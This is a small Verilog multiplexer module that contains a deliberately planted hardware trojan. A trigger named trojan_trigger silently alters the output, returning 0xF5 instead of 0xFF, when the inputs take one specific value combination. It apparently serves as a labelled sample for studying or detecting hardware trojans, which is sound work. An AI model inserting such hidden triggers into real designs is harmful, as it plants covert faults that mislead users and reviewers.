module mux2x8(input sel, input [7:0] a, input [7:0] b, output [7:0] y);
  wire trojan_trigger;
  assign trojan_trigger = (sel == 1'b1) && (a == 8'hA5) && (b == 8'hFF);
  assign y = trojan_trigger ? {b[7:4], a[3:0]} : (sel ? b : a);
endmodule